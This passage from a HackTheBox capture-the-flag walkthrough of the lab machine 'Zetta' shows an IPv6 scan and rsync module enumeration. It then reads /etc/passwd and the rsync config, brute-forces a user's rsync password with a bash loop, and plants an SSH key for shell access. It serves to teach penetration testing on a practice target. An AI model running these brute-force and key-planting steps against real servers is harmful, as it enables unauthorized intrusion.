+64 bytes from fe80::250:56ff:fe88:e5fa: icmp_seq=1 ttl=64 time=0.307 ms
+64 bytes from fe80::250:56ff:fe88:e5fa: icmp_seq=2 ttl=64 time=0.330 ms
+64 bytes from fe80::250:56ff:fe88:e5fa: icmp_seq=3 ttl=64 time=0.264 ms
+
+--- fe80::0250:56ff:fe88:e5fa ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2026ms
+rtt min/avg/max/mdev = 0.264/0.300/0.330/0.030 ms
+</span></code></pre></div></div>
+<p>I can use the global address from my workstation:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>ping6 <span class="nt">-c</span> 3 <span class="nt">-I</span> tun0 dead:beef::0250:56ff:fe88:e5fa
+<span class="go">PING dead:beef::0250:56ff:fe88:e5fa(dead:beef::250:56ff:fe88:e5fa) from dead:beef:2::1003 tun0: 56 data bytes
+64 bytes from dead:beef::250:56ff:fe88:e5fa: icmp_seq=1 ttl=63 time=22.6 ms
+64 bytes from dead:beef::250:56ff:fe88:e5fa: icmp_seq=2 ttl=63 time=26.8 ms
+64 bytes from dead:beef::250:56ff:fe88:e5fa: icmp_seq=3 ttl=63 time=46.0 ms
+
+--- dead:beef::0250:56ff:fe88:e5fa ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2005ms
+rtt min/avg/max/mdev = 22.568/31.803/46.023/10.203 ms
+</span></code></pre></div></div>
+<h3 id="ipv6-nmap">IPv6 nmap</h3>
+<p>With this address, I’ll rescan with <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nmap <span class="nt">-6</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp-ipv6 dead:beef::0250:56ff:fe88:e5fa
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-01 05:49 EDT
+Nmap scan report for dead:beef::250:56ff:fe88:e5fa
+Host is up (0.20s latency).
+Not shown: 50102 filtered ports, 15429 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+8730/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 69.42 seconds
+
+</span><span class="gp">root@kali# </span>nmap <span class="nt">-6</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 21,22,80,8730 <span class="nt">-oA</span> scans/nmap-tcpscripts-ipv6 dead:beef::0250:56ff:fe88:e5fa
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-01 05:53 EDT
+Nmap scan report for dead:beef::250:56ff:fe88:e5fa
+Host is up (0.029s latency).
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     Pure-FTPd
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA)
+|   256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA)
+|_  256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519)
+80/tcp   open  http    nginx
+|_http-title: Ze::a Share
+8730/tcp open  rsync   (protocol version 31)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| address-info: 
+|   IPv6 EUI-64: 
+|     MAC address: 
+|       address: 00:50:56:88:e5:fa
+|_      manuf: VMware
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.24 seconds
+</span></code></pre></div></div>
+<p>Nothing really new on 21, 22, or 80. But I’ve found Rsync running on 8730.</p>
+<h3 id="rsync---tcp-8730">Rsync - TCP 8730</h3>
+<p>I can use <code class="language-plaintext highlighter-rouge">rsycn</code> to enumerate this service. First I’ll lost the available modules:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>rsync <span class="nt">--list-only</span> <span class="nt">-a</span> rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/
+<span class="go">****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+You must have explicit, authorized permission to access this rsync
+server. Unauthorized attempts and actions to access or use this 
+system may result in civil and/or criminal penalties. 
+
+All activities performed on this device are logged and monitored.
+
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+@ZE::A staff
+
+This rsync server is solely for access to the zetta master server.
+The modules you see are either provided for "Backup access" or for
+"Cloud sync".
+
+
+bin             Backup access to /bin
+boot            Backup access to /boot
+lib             Backup access to /lib
+lib64           Backup access to /lib64
+opt             Backup access to /opt
+sbin            Backup access to /sbin
+srv             Backup access to /srv
+usr             Backup access to /usr
+var             Backup access to /var
+</span></code></pre></div></div>
+<p>I was unable to get any of them to connect without credentials. For example:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>rsync <span class="nt">--list-only</span> <span class="nt">-a</span> rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/var/
+<span class="go">****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+You must have explicit, authorized permission to access this rsync
+server. Unauthorized attempts and actions to access or use this 
+system may result in civil and/or criminal penalties. 
+
+All activities performed on this device are logged and monitored.
+
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+@ZE::A staff
+
+This rsync server is solely for access to the zetta master server.
+The modules you see are either provided for "Backup access" or for
+"Cloud sync".
+
+
+@ERROR: access denied to var from UNDETERMINED (dead:beef:2::1003)
+rsync error: error starting client-server protocol (code 5) at main.c(1675) [Receiver=3.1.3]
+</span></code></pre></div></div>
+<p>I can check them all with a loop:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>rsync <span class="nt">--list-only</span> <span class="nt">-a</span> rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/ | <span class="nb">grep</span> <span class="s2">"Backup access to"</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span> | <span class="k">while </span><span class="nb">read dir</span><span class="p">;</span> <span class="k">do </span>rsync <span class="nt">--list-only</span> <span class="nt">-a</span> rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/<span class="k">${</span><span class="nv">dir</span><span class="k">}</span>/ 2&gt;&amp;1 | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"access denied"</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"[-] </span><span class="k">${</span><span class="nv">dir</span><span class="k">}</span><span class="s2">: denied"</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">"[+] </span><span class="k">${</span><span class="nv">dir</span><span class="k">}</span><span class="s2">: ACCESS GRANTED"</span><span class="p">;</span> <span class="k">done</span>
+<span class="go">[-] bin: denied
+[-] boot: denied
+[-] lib: denied
+[-] lib64: denied
+[-] opt: denied
+[-] sbin: denied
+[-] srv: denied
+[-] usr: denied
+[-] var: denied
+</span></code></pre></div></div>
+<p>That loop breaks down as:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">rsync --list-only -a rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/</code> - List the modes</li>
+<li><code class="language-plaintext highlighter-rouge">grep "Backup access to"</code> - isolate the lines with the paths</li>
+<li><code class="language-plaintext highlighter-rouge">cut -d' ' -f1</code> - isolate the paths</li>
+<li><code class="language-plaintext highlighter-rouge">while read dir; do</code> - loop over the paths</li>
+<li><code class="language-plaintext highlighter-rouge">rsync --list-only -a rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/${dir}/ 2&gt;&amp;1</code> - try to list that path, forwarding stderr to stdout</li>
+<li><code class="language-plaintext highlighter-rouge">grep -q "access denied"</code> - <code class="language-plaintext highlighter-rouge">grep</code> without printing anything, just succeeding or failing</li>
+<li><code class="language-plaintext highlighter-rouge">&amp;&amp; echo "[-] ${dir}: denied" || echo "[+] ${dir}: ACCESS GRANTED";</code> - print message based on <code class="language-plaintext highlighter-rouge">grep</code> return code.</li>
+</ul>
+<p>I did notice that the message of the day says that there are modules for “Backup access” and “Cloud Sync”, but only “Backup access: ones show up. Eventually, I tried other directories typically found at the system root. <code class="language-plaintext highlighter-rouge">/home/</code> failed, but <code class="language-plaintext highlighter-rouge">/etc/</code> worked:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>rsync <span class="nt">--list-only</span> <span class="nt">-a</span> rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/etc/                                                                                                          
+<span class="go">****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+You must have explicit, authorized permission to access this rsync
+server. Unauthorized attempts and actions to access or use this
+system may result in civil and/or criminal penalties.
+
+All activities performed on this device are logged and monitored.
+
+****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******
+
+@ZE::A staff
+
+This rsync server is solely for access to the zetta master server.
+The modules you see are either provided for "Backup access" or for
+"Cloud sync".
+
+drwxr-xr-x          4,096 2019/08/31 15:56:06 .
+-rw-r--r--          2,981 2019/07/27 03:01:29 adduser.conf
+-rw-r--r--             44 2019/07/27 03:03:30 adjtime
+-rw-r--r--          1,994 2019/04/18 00:12:36 bash.bashrc
+-rw-r--r--            367 2018/03/02 15:03:58 bindresvport.blacklist
+-rw-r--r--          5,713 2019/07/27 03:07:27 ca-certificates.conf
+-rw-r--r--          1,042 2019/06/23 13:49:01 crontab
+-rw-r--r--          2,969 2019/02/26 04:30:35 debconf.conf
+-rw-r--r--              5 2019/04/19 07:00:00 debian_version
+-rw-r--r--            604 2016/06/26 16:00:56 deluser.conf
+-rw-r--r--            346 2018/01/14 16:27:01 discover-modprobe.conf
+...[snip]...
+</span></code></pre></div></div>
+<p>I can get the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>rsync <span class="nt">-a</span> rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/etc/passwd
+<span class="gp">root@kali# </span><span class="nb">cat </span>passwd 
+<span class="go">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+roy:x:1000:1000:roy,,,:/home/roy:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/sbin/nologin
+postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+</span></code></pre></div></div>
+<p>roy is the most interesting account.</p>
+<p>I’ll also look at the rsync related files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>rsync <span class="nt">--list-only</span> <span class="nt">-a</span> rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/etc/rsync<span class="k">*</span>                                 
+<span class="go">-rw-r--r--          2,929 2019/08/31 15:56:06 rsyncd.conf
+-rw-r--r--            558 2019/07/27 06:39:04 rsyncd.motd
+-r--------             13 2019/07/27 06:43:25 rsyncd.secrets
+</span></code></pre></div></div>
+<p>I don’t have access to the <code class="language-plaintext highlighter-rouge">rsyncd.secrets</code> file, but I can pull the other two. The motd file is just the message I’ve seen over and over. The <code class="language-plaintext highlighter-rouge">.conf</code> has lots of good stuff:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reverse lookup = no
+# GLOBAL OPTIONS
+
+# Change port so that we won't be in shodan
+port = 8730 
+use chroot = yes
+lock file = /var/lock/rsyncd
+motd file = /etc/rsyncd.motd
+strict modes = yes
+ignore errors = no
+ignore nonreadable = yes
+transfer logging = no
+log format = %t: host %h (%a) %o %f (%l bytes). Total %b bytes.
+dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
+read only = yes
+uid = backup
+gid = backup
+
+# MODULE OPTIONS
+
+# Allow backup server to backup /bin
+[bin]
+        comment = Backup access to /bin
+        path = /bin
+        # Allow access from backup server only.
+        hosts allow = 104.24.0.54
+
+# Allow backup server to backup /boot
+[boot]
+        comment = Backup access to /boot
+        path = /boot
+        # Allow access from backup server only.
+        hosts allow = 104.24.0.54
+
+# *** WORK IN PROGRESS *** 
+# Allow access to /etc to sync configuration files throughout the complete
+# cloud server farm. IP addresses from https://ip-ranges.amazonaws.com/ip-ranges.json
+#
+[etc]
+        comment = Backup access to /etc. Also used for cloud sync access.
+        path = /etc
+        # Do not leak .git repos onto the not so trusted slave servers in the cloud.
+        exclude = .git
+        # Temporarily disabled access to /etc for security reasons, the networks are
+        # have been found to access the share! Only allow 127.0.0.1, deny 0.0.0.0/0!
+        #hosts allow = 104.24.0.54 13.248.97.0/24 52.94.69.0/24 52.219.72.0/22
+        hosts allow = 127.0.0.1/32
+        hosts deny = 0.0.0.0/0
+        # Hiding it for now.
+        list = false
+
+# Allow backup server to backup /lib
+[lib]
+        comment = Backup access to /lib
+        path = /lib
+        # Allow access from backup server only.
+        hosts allow = 104.24.0.54
+
+# Allow backup server to backup /lib64
+[lib64]
+        comment = Backup access to /lib64
+        path = /lib64
+        # Allow access from backup server only.
+        hosts allow = 104.24.0.54
+
+# Allow backup server to backup /opt
+[opt]
+        comment = Backup access to /opt
+        path = /opt
+        # Allow access from backup server only.
+        hosts allow = 104.24.0.54
+
+# Allow backup server to backup /sbin
+[sbin]
+        comment = Backup access to /sbin
+        path = /sbin
+        # Allow access from backup server only.
+        hosts allow = 104.24.0.54
+
+# Allow backup server to backup /srv
+[srv]
+        comment = Backup access to /srv
+        path = /srv
+        # Allow access from backup server only.
+        hosts allow = 104.24.0.54
+
+# Allow backup server to backup /usr
+[usr]
+        comment = Backup access to /usr
+        path = /usr
+        # Allow access from backup server only.
+        hosts allow = 104.24.0.54
+
+# Allow backup server to backup /var
+[var]
+        comment = Backup access to /var
+        path = /var
+        # Allow access from backup server only.
+        hosts allow = 104.24.0.54
+
+# Syncable home directory for .dot file sync for me.
+# NOTE: Need to get this into GitHub repository and use git for sync.
+[home_roy]
+        path = /home/roy
+        read only = no
+        # Authenticate user for security reasons.
+        uid = roy
+        gid = roy
+        auth users = roy
+        secrets file = /etc/rsyncd.secrets
+        # Hide home module so that no one tries to access it.
+        list = false
+</code></pre></div></div>
+<p>Major take-aways:</p>
+<ul>
+<li>
+<p><code class="language-plaintext highlighter-rouge">read only = yes</code> - I won’t be able to write here</p>
+</li>
+<li>
+<p>The user and group of the process is backup.</p>
+</li>
+<li>
+<p>All of the modules I listed earlier have a config that look like:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Allow backup server to backup /bin</span>
+<span class="o">[</span>bin]
+        comment <span class="o">=</span> Backup access to /bin
+        path <span class="o">=</span> /bin
+        <span class="c"># Allow access from backup server only.</span>
+        hosts allow <span class="o">=</span> 104.24.0.54
+</code></pre></div> </div>
+<p>They are whitelisted to this Amazon IP, which is why I couldn’t connect.</p>
+</li>
+<li>
+<p>There are two additional modules in the config, <code class="language-plaintext highlighter-rouge">etc</code> and <code class="language-plaintext highlighter-rouge">home_roy</code>, both of which have <code class="language-plaintext highlighter-rouge">list = false</code>, which explain why I didn’t see them earlier. I’ll look at <code class="language-plaintext highlighter-rouge">etc</code> and why I was able to connect over IPv6 in <a href="#rsync-config">Beyond Root</a>.</p>
+</li>
+</ul>
+<p><code class="language-plaintext highlighter-rouge">home_roy</code> links to <code class="language-plaintext highlighter-rouge">/home/roy</code>. It is not read only. When I authenticate, it will be as user roy. And it defines a secrets file, <code class="language-plaintext highlighter-rouge">/etc/rsyncd.secrets</code>. That’s the file I noticed earlier but couldn’t read.</p>
+<h2 id="shell-as-roy">Shell as roy</h2>
+<h3 id="brute-force-password">Brute Force Password</h3>
+<p>If I try to connect to <code class="language-plaintext highlighter-rouge">home_roy</code>, it prompts for a password:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>rsync rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/home_roy
+<span class="go">...[snip]...
+Password: 
+@ERROR: auth failed on module home_roy
+rsync error: error starting client-server protocol (code 5) at main.c(1675) [Receiver=3.1.3]
+</span></code></pre></div></div>
+<p>I can’t see the <code class="language-plaintext highlighter-rouge">rsyncd.secrets</code> file, but I know it is 13 bytes in length from above. That’s likely <code class="language-plaintext highlighter-rouge">roy:</code> + 8 character password + a new line.</p>
+<p>I’ll create a wordlist of 8 byte words from <a href="https://github.com/danielmiessler/SecLists">SecList’s</a> <code class="language-plaintext highlighter-rouge">10-million-password-list-top-100000.txt</code></p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span><span class="nb">grep</span> <span class="nt">-E</span> <span class="s1">'^.{8}$'</span> /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt <span class="o">&gt;</span> 10-million-password-list-top-100000-8char.txt
+<span class="gp">root@kali# </span><span class="nb">ls</span> <span class="nt">-l</span> 10-million-password-list-top-100000-8char.txt 
+<span class="go">-rwxrwx--- 1 root vboxsf 307611 Sep  1 07:20 10-million-password-list-top-100000-8char.txt
+</span></code></pre></div></div>
+<p>I can connect to <code class="language-plaintext highlighter-rouge">rsync</code> without providing a password using the <code class="language-plaintext highlighter-rouge">RSYNC_PASSWORD</code> environment variable. If I set it to “password”, the connection still fails, but without prompting for a password:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span><span class="nb">export </span><span class="nv">RSYNC_PASSWORD</span><span class="o">=</span>password
+<span class="gp">root@kali# </span>rsync <span class="nt">--list-only</span> rsync://roy@[dead:beef::250:56ff:feb9:7e7c]:8730/home_roy
+<span class="go">...[snip]...
+@ERROR: auth failed on module home_roy
+rsync error: error starting client-server protocol (code 5) at main.c(1675) [Receiver=3.1.3]
+</span></code></pre></div></div>
+<p>Now I can loop over my wordlist, setting the environment variable, and try to log in with a <code class="language-plaintext highlighter-rouge">bash</code> one-liner:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span><span class="nb">cat </span>10-million-password-list-top-100000-8char.txt | <span class="k">while </span><span class="nb">read </span>pass<span class="p">;</span> <span class="k">do </span><span class="nb">export </span><span class="nv">RSYNC_PASSWORD</span><span class="o">=</span><span class="k">${</span><span class="nv">pass</span><span class="k">}</span><span class="p">;</span> rsync <span class="nt">--list-only</span> rsync://roy@[dead:beef::0250:56ff:fe88:e5fa]:8730/home_roy 2&gt;&amp;1 | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"auth failed on module home_roy"</span> <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">"[+] Found password: </span><span class="k">${</span><span class="nv">RSYNC_PASSWORD</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="nb">break</span><span class="p">;</span> <span class="o">}</span> <span class="k">done</span>
+<span class="go">[+] Found password: computer
+</span></code></pre></div></div>
+<p>Breaking that down:</p>
+<ul>
+<li>Dumps the password list into a <code class="language-plaintext highlighter-rouge">while read</code> loop.</li>
+<li>For each password, it saves it to the environment variable with <code class="language-plaintext highlighter-rouge">export</code>.</li>
+<li>It then tries to <code class="language-plaintext highlighter-rouge">rsync</code>, piping the results (both stdout and stderr) into a <code class="language-plaintext highlighter-rouge">grep</code>.</li>
+<li>The <code class="language-plaintext highlighter-rouge">grep</code> will match on “auth failed on module home_roy”, and return true if matched.</li>
+<li><code class="language-plaintext highlighter-rouge">||</code> is an or, so if the previous command (<code class="language-plaintext highlighter-rouge">grep</code>) failed (doesn’t find that failure note), it will run the commands between the <code class="language-plaintext highlighter-rouge">{ }</code>.</li>
+<li>In this case, that means print the password, and then exit the loop.</li>
+</ul>
+<h3 id="copy-files">Copy Files</h3>
+<p>Now with roy’s password, I can access that home directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>rsync <span class="nt">--list-only</span> rsync://roy@[dead:beef::0250:56ff:fe88:e5fa]:8730/home_roy 
+<span class="go">...[snip]...
+drwxr-xr-x          4,096 2019/07/28 06:52:29 .
+lrwxrwxrwx              9 2019/07/27 06:57:06 .bash_history
+-rw-r--r--            220 2019/07/27 03:03:28 .bash_logout
+-rw-r--r--          3,526 2019/07/27 03:03:28 .bashrc
+-rw-r--r--            807 2019/07/27 03:03:28 .profile
+-rw-------          4,752 2019/07/27 05:24:24 .tudu.xml
+-r--r--r--             33 2019/07/27 05:24:24 user.txt
+</span></code></pre></div></div>
+<p>I can copy the files to my host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>rsync <span class="nt">-a</span> rsync://roy@[dead:beef::0250:56ff:fe88:e5fa]:8730/home_roy/ <span class="nb">.</span>
+<span class="go">...[snip]...
+rsync: symlink "/media/sf_CTFs/hackthebox/zetta-10.10.10.156/rsync/.bash_history" -&gt; "/dev/null" failed: Operation not permitted (1)
+rsync error: some files/attrs were not transferred (see previous errors) (code 23) at main.c(1677) [generator=3.1.3]
+</span></code></pre></div></div>
+<p>I can’t get <code class="language-plaintext highlighter-rouge">.bash_history</code> because it’s linked to <code class="language-plaintext highlighter-rouge">/dev/null</code>, but I can get everything else, including <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span><span class="nb">cat </span>user.txt
+<span class="go">a575bdb3************************
+</span></code></pre></div></div>
+<h3 id="ssh-as-roy">SSH as roy</h3>
+<p>But more than access to his home directory, I would like a shell as roy. I remember that I have write access to this rsync module (or directory), so I’ll write my public key to <code class="language-plaintext highlighter-rouge">.ssh/authorized_keys</code> and ssh in. I can’t just copy the file into a folder that doesn’t exist. So I’ll generate a key and put the public key into a directory on my machine <code class="language-plaintext highlighter-rouge">.ssh/authorized_keys</code>. Then I’ll use <code class="language-plaintext highlighter-rouge">-aR</code> to copy the structure over:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>rsync <span class="nt">-aR</span> .ssh/  rsync://roy@[dead:beef::0250:56ff:fe88:e5fa]:8730/home_roy/
+</code></pre></div></div>
+<p>Once I do that, I can ssh with the private key:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>ssh <span class="nt">-i</span> ~/id_rsa_generated roy@10.10.10.156
+<span class="go">Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
+</span><span class="gp">roy@zetta:~$</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="shell-as-postgres">Shell as postgres</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>This box has hints scattered in a couple places.</p>
+<h4 id="tudu">tudu</h4>
+<p>In the home directory next to the flag is <code class="language-plaintext highlighter-rouge">.tudu.xml</code>. This contains a todo list. I can view it as xml (which I did when first solving), or I can open it in the <a href="https://gitlab.com/tudu/tudu">Tudu</a>, which is way cooler looking:</p>
+<p><img alt="tudu file" src="https://0xdfimages.gitlab.io/img/zetta-tudu.gif"/></p>
+<p>There’s a bunch of hints in there, as well as laying out the box so far.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>40% Homepage
+   [X] Choose bootstrap theme
+   [X] Create temporary homepage
+   [ ] Add more contents to the homepage
+   [ ] Add screenshots of the mobile apps
+   [ ] Add app store links for the mobile apps
+36% Server
+   57% HTTP Server
+       [X] Decide server: Apache vs. nginx
+       [X] Install server
+       [X] Configure server to serve static pages only
+       [X] Copy preliminary homepage to /var/www/html
+       [ ] Testing
+       [ ] Configure letsencrypt for HTTPS
+       [ ] Monitoring
+   33% Network
+       [X] Test IPv6 connectivity
+       [ ] Add ip6tables rules
+       [ ] Check for IPv4 specific service configuration
+    0% RSYNC Server
+       [ ] Rework rsyncd.conf because of security incident
+       [ ] Re-enable /etc syncing for cloud server to work properly again
+       [ ] Move my dotfile sync from rsync to git.
+   62% SYSLOG Server
+       [X] Decide server: syslog-ng vs. rsyslog
+       [X] Install server
+       [X] Configure server
+       [X] Check postgresql log for errors after configuration
+       [X] Prototype/test DB push of syslog events
+       [ ] Testing
+       [ ] Rework syslog configuration to push all events to the DB
+       [ ] Find/write GUI for syslog-db access/view
+    0% Security
+       [ ] Run Lynis and remediate findings.
+       [ ] Change shared password scheme from &lt;secret&gt;@userid to something more secure.
+</code></pre></div></div>
+<p>For example, all the steps about setting up the web site, and including the ftp auth module to accept 32 characters passwords are marked complete. There’s a note to add <code class="language-plaintext highlighter-rouge">iptables</code> rules for IPv6, currently undone, which is why I could connect in.</p>
+<p>I’ll take the following hints to move forward:</p>
+<ul>
+<li>Under RSYNC Server, there’s a note again about dotfile sync and using git.</li>
+<li>The SYSLOG Server section shows that it’s setup and running, but only with test events.</li>
+<li>Under Security, there’s a note about a password scheme that I’ll want to keep in mind.</li>
+</ul>
+<h4 id="recover-syslog-config">Recover SYSLOG Config</h4>
+<p>Time to find out what the author is trying to protect about <code class="language-plaintext highlighter-rouge">.git</code> dirs in <code class="language-plaintext highlighter-rouge">/etc</code>. <code class="language-plaintext highlighter-rouge">find</code> turns up three:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/etc$ </span>find <span class="nb">.</span> <span class="nt">-type</span> d <span class="nt">-name</span> .git 2&gt;/dev/null
+<span class="go">./pure-ftpd/.git
+./nginx/.git
+./rsyslog.d/.git
+</span></code></pre></div></div>
+<p>I spent some time looking over all of these, but the one that is most interesting is <code class="language-plaintext highlighter-rouge">rsyslog.d</code>. I can’t read the config:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/etc/rsyslog.d$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 16
+drwxr-xr-x  3 root root 4096 Jul 27 07:01 .
+drwxr-xr-x 76 root root 4096 Aug 31 15:56 ..
+drwxr-xr-x  8 root root 4096 Jul 27 05:52 .git
+-rw-------  1 root root  824 Jul 27 07:01 pgsql.con
+</span></code></pre></div></div>
+<p>I can also see in <code class="language-plaintext highlighter-rouge">/etc/rsyslog.conf</code> the line to include this file, so I know it’s in use:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">$IncludeConfig /etc/rsyslog.d/*.conf
+</span></code></pre></div></div>
+<p>I can see that there have been changes to the file that are not yet committed to git:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/etc/rsyslog.d$ </span>git status
+<span class="go">On branch master
+Changes not staged for commit:
+  (use "git add &lt;file&gt;..." to update what will be committed)
+  (use "git checkout -- &lt;file&gt;..." to discard changes in working directory)
+
+        modified:   pgsql.conf
+
+no changes added to commit (use "git add" and/or "git commit -a")
+</span></code></pre></div></div>
+<p>I’m not going to be able to use git to recover what’s not yet committed (I’ll check it out in <a href="#syslog-config-1">Beyond Root</a>), but I can get all the earlier versions since I have access to the .<code class="language-plaintext highlighter-rouge">git</code> directory. <code class="language-plaintext highlighter-rouge">git log</code> shows two previous commits:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">roy@zetta:/etc/rsyslog.d$ </span>git log
+<span class="go">commit e25cc20218f99abd68a2bf06ebfa81cd7367eb6a (HEAD -&gt; master)
+Author: root &lt;root@zetta.htb&gt;
+Date:   Sat Jul 27 05:51:43 2019 -0400
+
+    Adding/adapting template from manual.
+
+commit c98d292ac2981c0192a59d7cdad9d2d4a25bd4c5
+Author: root &lt;root@zetta.htb&gt;
+Date:   Sat Jul 27 03:11:22 2019 -0400
+
+    Initial revision.
